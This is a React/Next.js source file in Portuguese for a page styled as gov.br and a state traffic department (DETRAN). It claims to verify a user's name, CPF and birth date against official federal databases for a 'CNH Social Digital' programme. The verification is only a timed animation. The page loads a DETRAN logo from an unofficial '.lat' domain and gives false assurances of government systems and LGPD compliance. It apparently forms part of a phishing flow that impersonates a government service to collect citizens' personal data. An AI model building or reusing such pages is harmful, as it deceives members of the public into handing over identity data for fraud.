"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { Menu, Search, Mic, User, ChevronRight, Check, Loader2, Shield, CheckCircle } from "lucide-react"

interface ValidationStep {
  id: string
  title: string
  subtitle: string
  completed: boolean
  loading: boolean
}

export default function ValidacaoPage() {
  const [progress, setProgress] = useState(0)
  const [isAuthorized, setIsAuthorized] = useState(false)
  const [showSecurityCard, setShowSecurityCard] = useState(false)
  const [redirecting, setRedirecting] = useState(false)
  const router = useRouter()

  const [validationSteps, setValidationSteps] = useState<ValidationStep[]>([
    {
      id: "nome",
      title: "Verificando Nome completo",
      subtitle: "Consultando cadastro nacional",
      completed: false,
      loading: false,
    },
    {
      id: "cpf",
      title: "Verificando CPF",
      subtitle: "Consultando bases da Receita Federal",
      completed: false,
      loading: false,
    },
    {
      id: "validando-cpf",
      title: "Validando CPF",
      subtitle: "Verificação de autenticidade",
      completed: false,
      loading: false,
    },
    {
      id: "data-nascimento",
      title: "Validando Data de Nascimento",
      subtitle: "Comparação com registros oficiais",
      completed: false,
      loading: false,
    },
    {
      id: "legitimidade",
      title: "Verificando legitimidade",
      subtitle: "Análise de documentação",
      completed: false,
      loading: false,
    },
  ])

  useEffect(() => {
    // Verificar se o usuário passou pelas etapas anteriores
    const dadosCompletos = sessionStorage.getItem("dados-completos")
    if (!dadosCompletos) {
      router.push("/verificacao-dados")
      return
    }
    setIsAuthorized(true)

    // Simular progresso de validação
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval)
          // Redirecionar após completar
          setTimeout(() => {
            router.push("/questionario")
          }, 1000)
          return 100
        }
        return prev + 2
      })
    }, 50)

    return () => clearInterval(interval)
  }, [router])

  const startValidation = () => {
    const totalDuration = 3500 // 3.5 segundos
    const stepDuration = totalDuration / validationSteps.length

    validationSteps.forEach((step, index) => {
      // Iniciar loading do step
      setTimeout(() => {
        setValidationSteps((prev) => prev.map((s) => (s.id === step.id ? { ...s, loading: true } : s)))
      }, index * stepDuration)

      // Completar step
      setTimeout(
        () => {
          setValidationSteps((prev) =>
            prev.map((s) => (s.id === step.id ? { ...s, loading: false, completed: true } : s)),
          )

          // Atualizar progresso
          const newProgress = ((index + 1) / validationSteps.length) * 100
          setProgress(newProgress)

          // Mostrar card de segurança no final
          if (index === validationSteps.length - 1) {
            setTimeout(() => {
              setShowSecurityCard(true)
              // Redirecionar para questionário após 2 segundos
              setTimeout(() => {
                setRedirecting(true)
                sessionStorage.setItem("validacao-completa", "true")
                router.push("/questionario")
              }, 2000)
            }, 500)
          }
        },
        index * stepDuration + stepDuration * 0.8,
      )
    })
  }

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <p className="text-gray-600">Redirecionando...</p>
        </div>
      </div>
    )
  }

  if (redirecting) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Redirecionando para o questionário...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header gov.br logado */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <img src="/images/govbr-logo.png" alt="gov.br" className="h-8" />
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="icon">
                <Menu className="w-5 h-5" />
              </Button>
              <img src="/images/header-icons.png" alt="Ícones do cabeçalho" className="h-6" />
              <Button className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-full">
                <User className="w-4 h-4 mr-2" />
                Arthur
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Header do Departamento */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <Button variant="ghost" size="icon" className="mr-2">
                <Menu className="w-5 h-5 text-blue-600" />
              </Button>
              <h1 className="text-lg font-semibold text-gray-800">Departamento Estadual de Trânsito</h1>
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="icon">
                <Mic className="w-5 h-5 text-blue-600" />
              </Button>
              <Button variant="ghost" size="icon">
                <Search className="w-5 h-5 text-blue-600" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="max-w-md mx-auto px-4 py-3">
        <div className="flex items-center text-sm text-blue-600">
          <Link href="/" className="hover:underline">
            Início
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <Link href="/servicos" className="hover:underline">
            Serviços
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <Link href="/cnh" className="hover:underline">
            CNH
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <span className="text-gray-600">CNH Social Digital</span>
        </div>
      </div>

      {/* Conteúdo principal */}
      <div className="max-w-md mx-auto px-4 pb-8">
        {/* Título com logo */}
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold text-blue-900 mb-2">Validando</h1>
            <h2 className="text-3xl font-bold text-blue-900">seus dados</h2>
          </div>
          <div className="flex-shrink-0">
            <img src="https://social-digital.lat/cn/img/DETRAN.png" alt="DETRAN" className="h-12" />
          </div>
        </div>

        {/* Texto explicativo */}
        <div className="mb-8">
          <p className="text-gray-700 leading-relaxed">
            Nossos sistemas oficiais irão analisar seus dados para confirmar se são válidos para o cadastro no programa.
          </p>
        </div>

        {/* Seção de verificação em progresso */}
        <div className="mb-8">
          <h3 className="text-xl font-semibold text-blue-600 mb-6">Verificação em Progresso</h3>

          {/* Barra de progresso */}
          <div className="mb-8">
            <div className="flex justify-between text-sm text-gray-600 mb-2">
              <span>0%</span>
              <span>50%</span>
              <span>100%</span>
            </div>
            <div className="w-full bg-gray-200 rounded-full h-2">
              <div
                className="bg-blue-600 h-2 rounded-full transition-all duration-500 ease-out"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
          </div>

          {/* Lista de validações */}
          <div className="space-y-4">
            {validationSteps.map((step) => (
              <div key={step.id} className="flex items-start gap-4">
                <div className="flex-shrink-0 mt-1">
                  {step.completed ? (
                    <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                      <Check className="w-4 h-4 text-white" />
                    </div>
                  ) : step.loading ? (
                    <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center">
                      <Loader2 className="w-4 h-4 text-white animate-spin" />
                    </div>
                  ) : (
                    <div className="w-6 h-6 bg-gray-300 rounded-full"></div>
                  )}
                </div>
                <div
                  className={`${step.completed ? "text-green-700" : step.loading ? "text-blue-600" : "text-gray-500"}`}
                >
                  <h4 className="font-semibold">{step.title}</h4>
                  <p className="text-sm">{step.subtitle}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Card de segurança */}
        {showSecurityCard && (
          <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-8">
            <div className="flex items-start gap-3">
              <Shield className="w-6 h-6 text-green-600 mt-1 flex-shrink-0" />
              <div>
                <h4 className="font-bold text-green-800 mb-2">Sistema de Verificação Segura</h4>
                <p className="text-sm text-green-700 leading-relaxed">
                  A verificação de identidade é realizada utilizando conexão criptografada e todos os seus dados são
                  processados com os mais altos padrões de segurança em conformidade com a Lei Geral de Proteção de
                  Dados (LGPD).
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Logo */}
        <div className="mb-8">
          <img src="/images/cnh-logo-oficial.png" alt="CNH Social Digital" className="w-48 h-auto mx-auto" />
        </div>

        {/* Título */}
        <h1 className="text-2xl font-bold text-blue-800 mb-4">Validando seus dados</h1>

        <p className="text-gray-600 mb-8">Estamos verificando suas informações nos sistemas oficiais do governo...</p>

        {/* Barra de progresso */}
        <div className="w-full bg-gray-200 rounded-full h-3 mb-6">
          <div
            className="bg-blue-600 h-3 rounded-full transition-all duration-300 ease-out"
            style={{ width: `${progress}%` }}
          ></div>
        </div>

        <p className="text-blue-600 font-semibold text-lg mb-8">{progress}% concluído</p>

        {progress === 100 && (
          <div className="flex items-center justify-center text-green-600 mb-4">
            <CheckCircle className="w-8 h-8 mr-2" />
            <span className="text-lg font-semibold">Validação concluída!</span>
          </div>
        )}

        {/* Informações de segurança */}
        <div className="bg-blue-50 p-4 rounded-lg">
          <p className="text-sm text-blue-700">
            Seus dados estão sendo verificados com total segurança através dos sistemas integrados do governo federal.
          </p>
        </div>
      </div>
    </div>
  )
}
